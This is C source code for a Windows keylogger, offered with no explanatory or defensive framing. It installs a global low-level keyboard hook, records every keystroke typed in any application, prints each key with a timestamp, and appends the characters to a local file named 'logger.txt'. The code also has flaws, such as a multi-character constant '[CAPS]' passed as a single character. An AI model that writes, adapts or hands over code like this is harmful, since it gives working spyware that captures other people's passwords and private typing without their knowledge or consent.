#include <stdio.h>
#include <windows.h>

HKL hkl;

void writeToFile(char text)
{
    FILE *fptr;

    fptr = fopen("logger.txt", "a");
    fprintf(fptr, "%c", text);
    fclose(fptr);
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{

    if (wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;

        DWORD key = pKey->vkCode;
        DWORD time = pKey->time;

        printf("\nKey Pressed: %c", key);
        printf(". At time: %d", time);

        if (key == VK_RETURN)
        {
            writeToFile('\n');
        }
        else if (key == VK_SPACE)
        {
            writeToFile(' ');
        }
        else if (key == VK_BACK)
        {

        }
        else if (key==VK_CAPITAL)
        {
            writeToFile('[CAPS]');
        }
        else
        {
            char c = MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, hkl);

            if(c!=0){
                writeToFile(c);
            }
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    hkl = LoadKeyboardLayoutW(L"00000409", KLF_ACTIVATE);

    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}